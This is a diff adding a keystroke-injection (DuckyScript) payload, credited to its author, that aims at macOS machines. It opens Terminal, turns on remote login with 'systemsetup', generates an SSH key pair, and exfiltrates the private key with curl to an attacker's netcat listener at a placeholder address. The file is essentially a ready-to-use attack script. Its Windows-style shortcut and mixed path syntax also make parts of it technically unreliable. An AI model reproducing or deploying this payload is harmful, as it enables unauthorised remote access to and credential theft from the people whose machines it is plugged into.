@@ -1,0 +1,93 @@
+REM 	- made by Someoneishere - 
+REM  This is a payload which makes
+REM  the targets macos, startup
+REM  ssh and then it will make a id_rsa
+REM  which will be sent to netcat listener using curlS
+REM  (usage: macOS)
+
+REM  Here I am defining the commands that I am going to be
+REM  using the most.
+REM  use nc -l PORT to listen
+
+REM  you will need to put the ip for the listener and also the passphrase that you
+REM  want ssh to encrypt the id_rsa with.
+
+
+DEFINE WAIT 1000
+DEFINE WHILE 200
+DEFINE COUPLE 500
+
+REM  [Optional] - this is the id_rsa passphrase that will be prompted when joining ssh
+REM  leaving it empty means that there wouldn't be any passphrase needed
+
+DEFINE PASSPHRASE someonewashere  
+DEFINE SSHPATH /home/%USERPROFILE%/.ssh/id_rsa
+
+REM   if the delays are too long, then simple change them where it says - DEFINE COUPLE / WHILE / WAIT
+
+REM  ! Starting the script !
+
+DELAY 4000 
+GUI r 
+DELAY WHILE
+STRING Terminal
+DELAY WHILE
+ENTER
+DELAY COUPLE
+STRING systemsetup -setremotelogin on
+
+DELAY WHILE
+ENTER
+ENTER
+ENTER
+DELAY WAIT
+STRING ssh-keygen -t rsa 
+DELAY WHILE 
+ENTER
+DELAY COUPLE
+STRING SSHPATH
+DELAY WHILE
+ENTER
+DELAY COUPLE
+STRING PASSPHRASE
+DELAY WHILE
+ENTER
+DELAY COUPLE
+STRING PASSPHRASE
+DELAY WHILE
+ENTER
+
+REM  - here we have finished with the processof generating the
+REM    id_rsa and id_rsa.pub
+
+DELAY WAIT
+STRING ssh-add /home/%USERPROFILE%/.ssh/id_rsa
+DELAY COUPLE
+STRING PASSPHRASE
+DELAY WHILE
+ENTER
+DELAY COUPLE
+
+REM  - here we have added our id_rsa to the local ssh keychain (initialization)
+
+ENTER
+DELAY WAIT
+STRING curl -F attachment=@/home/%USERPROFILE%/.ssh/id_rsa http://ADD_IP_FOR_NETCAT_HERE_ALSO_PORT
+DELAY WHILE
+ENTER
+
+REM  - here we are sending the data using curl to our netcat listener
+
+REM  - to exit 
+
+DELAY 4000
+CTRL c
+ENTER
+DELAY WAIT
+STRING exit
+DELAY WHILE
+ENTER
+DELAY WAIT
+GUI q
+ENTER
+
